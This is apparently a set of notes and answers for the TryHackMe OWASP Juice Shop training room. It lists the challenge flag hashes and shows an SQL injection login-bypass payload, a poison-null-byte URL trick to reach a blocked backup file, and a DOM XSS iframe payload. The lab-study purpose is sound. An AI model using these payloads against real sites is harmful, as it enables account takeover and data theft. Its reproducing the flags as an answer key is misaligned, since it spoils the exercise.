# Notes for the room OWASP Juice Shop (https://tryhackme.com/room/owaspjuiceshop). Part of the "Complete Beginner Path"

### Task 2 

Question #1: What's the Administrator's email address?

```
admin@juice-sh.op
```

Question #2: What parameter is used for searching?

```
q
```

Question #3: What show does Jim reference in his review? 

```
Star Trek
```

### Task 3

Question #1: Log into the administrator account!

Use burp suite, remember the proxy in firefox and get the intercept when trying to login. Change email and password to>

```
{
	'email':'  ' or 1=1--',
	'password': 'a'
}
```
Answer
```
32a5e0f21372bcc1000a6088b93b458e41f0e02a
```

Question #2: Log into the Bender account!

```
fb364762a3c102b2db932069c0e6b78e738d4066
```

### Task 4

Question #1: Bruteforce the Administrator account's password!

```
c2110d06dc6f81c67cd8099ff0ba601241f1ac0e
```

Question #2: Reset Jim's password!

```
094fbc9b48e525150ba97d05b942bbf114987257
```

### Task 5

Question #1: Access the Confidential Document!

```
edf9281222395a1c5fee9b89e32175f1ccf50c5b
```

Question #2: Log into MC SafeSearch's account!

```
66bdcffad9e698fd534003fbb3cc7e2b7b55d7f0
```

Question #3: Download the Backup file!

To get around this, we will use a character bypass called "Poison Null Byte". A Poison Null Byte looks like this: %00. 

Note that we can download it using the url, so we will encode this into a url encoded format.

The Poison Null Byte will now look like this: %2500. Adding this and then a .md to the end will bypass the 403 error!

Answer

```
bfc1e6b4a16579e85e06fee4c36ff8c02fb13795
```

### Task 6

Question #1: Access the administration page!

```
946a799363226a24822008503f5d1324536629a0
```

Question #2: View another user's shopping basket!

```
41b997a36cc33fbe4f0ba018474e19ae5ce52121
```

Question #3: Remove all 5-star reviews!

```
50c97bcce0b895e446d61c83a21df371ac2266ef
```

### Task 7

Question #1: Perform a DOM XSS!

Insert this into the searchbar:

```
<iframe src="javascript:alert(`xss`)"> 
```

Answer:

```
9aaf4bbea5c30d00a1f5bbcfce4db6d4b0efe0bf
```

Question #2: Perform a persistent XSS!

```
149aa8ce13d7a4a8a931472308e269c94dc5f156
```

Question #3: Perform a reflected XSS!

```
23cefee1527bde039295b2616eeb29e1edc660a0
```

### Task 8

Access the /#/score-board/ page
```
7efd3174f9dd5baa03a7882027f2824d2f72d86e
```

